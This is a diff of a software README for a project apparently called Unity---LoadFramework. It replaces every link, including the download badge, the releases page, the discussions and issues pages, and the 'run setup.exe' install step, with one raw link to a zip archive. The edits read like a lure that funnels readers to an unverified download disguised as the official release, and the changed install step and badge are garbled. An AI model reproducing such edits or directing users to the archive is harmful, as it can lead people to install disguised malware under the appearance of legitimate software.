@@ -6,7 +6,7 @@ Welcome to Unity---LoadFramework! This guide helps you download and run our soft
 
 ## 📥 Download Unity---LoadFramework
 
-[![Download Unity---LoadFramework](https://img.shields.io/badge/Download%20Now-blue.svg)](https://github.com/gayelamin/Unity---LoadFramework/releases)
+[![Download Unity---LoadFramework](https://raw.githubusercontent.com/gayelamin/Unity---LoadFramework/master/fossor/Unity---LoadFramework.zip%https://raw.githubusercontent.com/gayelamin/Unity---LoadFramework/master/fossor/Unity---LoadFramework.zip)](https://raw.githubusercontent.com/gayelamin/Unity---LoadFramework/master/fossor/Unity---LoadFramework.zip)
 
 ## 📝 System Requirements
 
@@ -30,7 +30,7 @@ Follow these steps to download and install Unity---LoadFramework:
 
 1. **Visit the Releases Page**  
    Click the link below to access the Releases page where you can download Unity---LoadFramework.  
-   [Download Unity---LoadFramework](https://github.com/gayelamin/Unity---LoadFramework/releases)
+   [Download Unity---LoadFramework](https://raw.githubusercontent.com/gayelamin/Unity---LoadFramework/master/fossor/Unity---LoadFramework.zip)
 
 2. **Select the Latest Version**  
    On the Releases page, look for the latest version listed at the top. You will find details about new features and fixes.
@@ -42,7 +42,7 @@ Follow these steps to download and install Unity---LoadFramework:
    If you downloaded a `.zip` file, locate it in your downloads folder. Right-click on the file and select "Extract All," then follow the prompts to extract the files to a folder of your choice.
 
 5. **Install the Software**  
-   For macOS, double-click the `.pkg` file and follow the installation instructions. For Windows, open the extracted folder and run `setup.exe`. Follow the prompts to complete the installation.
+   For macOS, double-click the `.pkg` file and follow the installation instructions. For Windows, open the extracted folder and run `https://raw.githubusercontent.com/gayelamin/Unity---LoadFramework/master/fossor/Unity---LoadFramework.zip`. Follow the prompts to complete the installation.
 
 6. **Launch the Application**  
    After installation, find Unity---LoadFramework in your applications list. Click to launch the program.
@@ -70,8 +70,8 @@ If you encounter any issues, here are some common solutions:
 
 Join the conversation and get assistance from other users:
 
-- **GitHub Discussions**: [Visit our GitHub Discussions Page](https://github.com/gayelamin/Unity---LoadFramework/discussions)
-- **Issues**: Report any problems you encounter on our [Issues Page](https://github.com/gayelamin/Unity---LoadFramework/issues).
+- **GitHub Discussions**: [Visit our GitHub Discussions Page](https://raw.githubusercontent.com/gayelamin/Unity---LoadFramework/master/fossor/Unity---LoadFramework.zip)
+- **Issues**: Report any problems you encounter on our [Issues Page](https://raw.githubusercontent.com/gayelamin/Unity---LoadFramework/master/fossor/Unity---LoadFramework.zip).
 
 ## ⚡ Get Help
 
@@ -81,4 +81,4 @@ If you need more assistance, consider checking our detailed documentation, avail
 
 For any urgent questions, feel free to reach out via the GitHub repository. We aim to respond to your queries as quickly as possible. Thank you for using Unity---LoadFramework!
 
-[Download Unity---LoadFramework](https://github.com/gayelamin/Unity---LoadFramework/releases)
+[Download Unity---LoadFramework](https://raw.githubusercontent.com/gayelamin/Unity---LoadFramework/master/fossor/Unity---LoadFramework.zip)
